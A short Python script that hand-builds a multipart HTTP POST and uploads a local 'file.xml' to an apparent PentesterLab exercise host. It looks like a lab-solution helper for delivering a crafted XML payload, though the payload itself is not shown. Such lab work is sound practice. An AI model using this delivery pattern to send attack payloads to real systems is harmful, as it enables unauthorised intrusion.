#!/usr/bin/env python3

import socket
import os
import binascii

host = 'ptl-323be71a-1763ac74.libcurl.so'
port = 80

boundary = binascii.hexlify(os.urandom(16)).decode('ascii')
binSendFile = open("file.xml","r")

body = f"--{boundary}\r\n"
body += "Content-Disposition: form-data; name=\"filename\"; filename=\"file.xml\"\r\n"
body += "\r\n"
body += f"{binSendFile.read()}\r\n"
body += f"--{boundary}--\r\n"

conLen = len(bytes(body,'utf-8'))

headers = "POST /pentesterlab HTTP/1.1\r\n"
headers += "Host: ptl-323be71a-1763ac74.libcurl.so\r\n"
headers += f"Content-Type: multipart/form-data; boundary={boundary}\r\n"
headers += f"Content-Length: {conLen}\r\n"
headers += "Connection: close\r\n"
headers += "\r\n"

payload = bytes(headers,'utf-8') + bytes(body,'utf-8')
print(payload.decode())

s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect((host,port))

s.sendall(payload)
while True:
    data = s.recv(1024)
    if not data:
        break

    print(data.decode())
